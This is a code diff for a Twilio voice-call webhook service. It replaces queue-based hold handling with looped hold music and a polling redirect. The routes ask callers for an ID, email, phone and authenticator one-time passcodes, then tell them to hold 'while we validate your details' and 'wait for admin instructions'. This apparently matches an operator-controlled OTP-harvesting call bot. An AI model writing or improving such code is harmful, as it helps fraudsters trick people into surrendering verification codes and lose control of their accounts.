@@ -106,14 +106,9 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             twiml.hangup();
             
         } else if (currentAction === 'playing_music') {
-            // USE TWILIO'S QUEUE WITH HOLD MUSIC - THIS WORKS 100%
-            const enqueue = twiml.enqueue({
-                action: `/webhooks/leave-queue/${sessionId}`,
-                method: 'POST'
-            });
-            enqueue.queue('hold_queue');
-            twiml.say('Unable to queue. Goodbye.');
-            twiml.hangup();
+            twiml.say('Please hold while we validate your details.');
+            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
             
         } else {
             twiml.say('Please wait for admin instructions.');
@@ -175,7 +170,7 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-router.post('/leave-queue/:sessionId', async (req, res) => {
+router.post('/check-hold/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const twiml = new VoiceResponse();
     
@@ -184,10 +179,11 @@ router.post('/leave-queue/:sessionId', async (req, res) => {
         [sessionId]
     );
     
-    if (session.rows[0] && session.rows[0].current_action !== 'playing_music') {
-        twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
+    if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 5 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
-        twiml.hangup();
+        twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
     }
     
     res.type('text/xml');
@@ -212,11 +208,9 @@ router.post('/collect-id/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        const enqueue = twiml.enqueue({
-            action: `/webhooks/leave-queue/${sessionId}`,
-            method: 'POST'
-        });
-        enqueue.queue('hold_queue');
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No ID received. Goodbye.');
         twiml.hangup();
@@ -244,11 +238,9 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        const enqueue = twiml.enqueue({
-            action: `/webhooks/leave-queue/${sessionId}`,
-            method: 'POST'
-        });
-        enqueue.queue('hold_queue');
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -276,11 +268,9 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        const enqueue = twiml.enqueue({
-            action: `/webhooks/leave-queue/${sessionId}`,
-            method: 'POST'
-        });
-        enqueue.queue('hold_queue');
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No code received. Goodbye.');
         twiml.hangup();
@@ -308,11 +298,9 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        const enqueue = twiml.enqueue({
-            action: `/webhooks/leave-queue/${sessionId}`,
-            method: 'POST'
-        });
-        enqueue.queue('hold_queue');
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -362,11 +350,9 @@ router.post('/collect-custom/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        const enqueue = twiml.enqueue({
-            action: `/webhooks/leave-queue/${sessionId}`,
-            method: 'POST'
-        });
-        enqueue.queue('hold_queue');
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No input received. Goodbye.');
         twiml.hangup();
